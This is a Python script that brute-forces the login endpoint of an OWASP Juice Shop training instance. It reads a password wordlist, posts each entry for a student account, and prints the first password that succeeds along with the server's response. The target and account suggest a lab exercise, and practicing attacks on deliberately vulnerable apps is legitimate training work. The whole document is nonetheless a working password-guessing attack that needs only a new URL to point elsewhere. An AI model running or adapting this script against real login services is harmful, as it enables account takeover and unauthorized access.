#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Created on Jun 20, 2023, 6:47:08 AM

import sys
import requests


#if len(sys.argv) != 2:
 # print("usage: " + sys.argv[0] + " <FQDN> <username>")
 # sys.exit()

# url = 'https://' + sys.argv[1] + '/rest/user/login'
url = 'http://juice.f5trn.com/rest/user/login'
cookies = dict(language='en', cookieconsent_status='dismiss', io='')
pwdfile = 'juice_passwords.txt'

with open(pwdfile) as fp:
        for index, pwd in enumerate(fp):
                payload = {"email": "student1@f5.com", "password": pwd.replace('\n', '')}
                r = requests.post(url, data=payload, cookies=cookies)
                print("{}: {}".format(str(payload), r.status_code))
                if r.status_code == 200:
                        print("Successful login: " + pwd)
                        print(r.content)
                        fp.close()
                        exit()

print("No successful login found!")


